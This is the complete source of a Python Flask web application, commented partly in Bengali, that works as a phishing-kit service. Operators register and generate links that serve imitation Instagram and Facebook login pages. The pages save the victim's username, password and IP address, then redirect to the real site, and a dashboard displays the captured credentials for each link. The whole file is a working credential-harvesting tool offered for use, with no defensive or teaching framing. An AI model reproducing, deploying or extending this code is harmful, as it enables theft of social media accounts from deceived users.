import os
import uuid
import sqlite3
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'your-super-secret-key-change-this'

DB_NAME = 'phish_data.db'

# ----------------- ডাটাবেস -----------------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        template TEXT,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    conn.commit()
    conn.close()

init_db()

# ----------------- HTML টেমপ্লেট (সরাসরি স্ট্রিং - কোনো templates ফোল্ডার লাগবে না) -----------------
REGISTER_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Register</title></head>
<body>
<h2>Register</h2>
<form method="post">
    <input name="username" placeholder="Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Register</button>
</form>
<a href="/login">Login</a>
</body>
</html>
'''

LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<h2>Login</h2>
<form method="post">
    <input name="username" placeholder="Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Login</button>
</form>
<a href="/register">Register</a>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Dashboard</title></head>
<body>
<h2>Dashboard - Welcome {{ user }}</h2>
<a href="/create_link">➕ Create New Phishing Link</a>
<h3>Your Links</h3>
<ul>
    {% for link in links %}
    <li>
        🔗 <code>{{ request.host_url }}f/{{ link.link_id }}</code> ({{ link.template }}) 
        - <a href="/victims/{{ link.link_id }}">👁️ View Victims</a>
    </li>
    {% endfor %}
</ul>
<a href="/logout">Logout</a>
</body>
</html>
'''

CREATE_LINK_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Create Link</title></head>
<body>
<h2>Generate New Phishing Link</h2>
<form method="post">
    <select name="template">
        <option value="instagram">Instagram</option>
        <option value="facebook">Facebook</option>
    </select>
    <button type="submit">Generate</button>
</form>
<a href="/dashboard">Back</a>
</body>
</html>
'''

INSTAGRAM_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Instagram Login</title></head>
<body style="background:#fafafa; font-family:sans-serif;">
<div style="width:350px; margin:100px auto; background:white; padding:40px; border-radius:10px;">
    <h2>Instagram</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Username or Email" style="width:100%; padding:10px; margin:10px 0;" required><br>
        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required><br>
        <button type="submit" style="background:#0095f6; color:white; border:none; padding:10px; width:100%;">Log In</button>
    </form>
</div>
</body>
</html>
'''

FACEBOOK_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body style="background:#e9ebee; font-family:sans-serif;">
<div style="width:400px; margin:150px auto; background:white; padding:30px; border-radius:8px;">
    <h2>Facebook</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Email or Phone" style="width:100%; padding:10px; margin:10px 0;" required><br>
        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required><br>
        <button type="submit" style="background:#1877f2; color:white; border:none; padding:10px; width:100%;">Log In</button>
    </form>
</div>
</body>
</html>
'''

VICTIMS_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Victims - {{ link_id }}</title></head>
<body>
<h2>Captured Credentials for Link: {{ link_id }}</h2>
<table border="1" cellpadding="5">
    <tr><th>Username/Email</th><th>Password</th><th>IP Address</th><th>Date/Time</th></tr>
    {% for v in victims %}
    <tr>
        <td>{{ v.username }}</td>
        <td>{{ v.password }}</td>
        <td>{{ v.ip }}</td>
        <td>{{ v.submitted_at }}</td>
    </tr>
    {% endfor %}
</table>
<a href="/dashboard">⬅ Back to Dashboard</a>
</body>
</html>
'''

# ----------------- রাউট -----------------
@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists. <a href='/register'>Try again</a>"
    return render_template_string(REGISTER_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return "Invalid credentials. <a href='/login'>Try again</a>"
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
    conn.close()
    return render_template_string(DASHBOARD_HTML, user=session['username'], links=links)

@app.route('/create_link', methods=['GET', 'POST'])
def create_link():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        template = request.form['template']
        link_id = str(uuid.uuid4())[:8]
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO links (user_id, link_id, template, created_at) VALUES (?, ?, ?, ?)",
                  (session['user_id'], link_id, template, datetime.now()))
        conn.commit()
        conn.close()
        return redirect(url_for('dashboard'))
    return render_template_string(CREATE_LINK_HTML)

@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    template_name = result[0]
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                  (link_id, username, password, ip, datetime.now()))
        conn.commit()
        conn.close()
        # Redirect to real site
        real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
        return f"<h2>Redirecting...</h2><script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script>"
    conn.close()
    if template_name == 'instagram':
        return render_template_string(INSTAGRAM_PAGE)
    else:
        return render_template_string(FACEBOOK_PAGE)

@app.route('/victims/<link_id>')
def view_victims(link_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != session['user_id']:
        conn.close()
        return "Unauthorized", 403
    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
    victims = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
    conn.close()
    return render_template_string(VICTIMS_HTML, link_id=link_id, victims=victims)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)